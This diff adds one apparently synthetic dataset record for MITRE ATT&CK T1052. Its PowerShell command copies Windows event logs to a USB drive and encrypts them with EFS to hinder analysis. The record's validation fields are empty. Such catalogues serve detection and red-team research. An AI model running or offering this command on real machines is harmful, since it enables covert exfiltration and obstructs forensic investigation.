@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $dst=Join-Path $usb 'Diag'; Copy-Item 'C:\\Windows\\System32\\winevt\\Logs' -Destination $dst -Recurse -Force; cipher /E /A $dst",
+  "explanation": "Copies Windows event logs to a folder on the USB and encrypts the folder with EFS to hinder analysis if accessed on the same system.",
+  "rationale_steps": [
+    "Find removable media",
+    "Copy event logs to USB",
+    "Encrypt copied data using EFS to deter casual inspection"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-286b5fcc",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
